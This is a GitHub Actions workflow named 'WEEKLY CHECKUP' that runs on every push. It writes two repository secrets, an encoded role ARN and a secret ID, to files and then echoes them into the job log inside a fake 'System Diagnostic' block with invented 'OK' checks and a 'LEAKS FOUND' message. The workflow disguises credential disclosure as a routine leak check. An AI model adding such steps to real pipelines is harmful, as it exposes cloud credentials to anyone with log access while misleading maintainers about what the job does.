name: WEEKLY CHECKUP






on:
  push:





jobs:
 Weekly-checks:
  runs-on: ubuntu-latest






  steps:
    - name: Encrypted Github secrets
      run: |
        echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret.txt
        echo "${{ secrets.ENCODED_SECRET_ID }}" > secret1.txt
    - name: Leak check
      run: |
        
        # Print "diagnostic output"
        echo "::group::System Diagnostic"
        echo "ðŸ”§ ENV CHECK: OK"
        echo "ðŸ”§ ROLE CHECK: OK"
        echo "ðŸ”§ Role_arn: $(cat secret.txt)"
        echo "ðŸ”§ secret_id: $(cat secret1.txt)"
        echo "ðŸ”§ TEST FAILED - LEAKS FOUND"
        echo "::endgroup::"
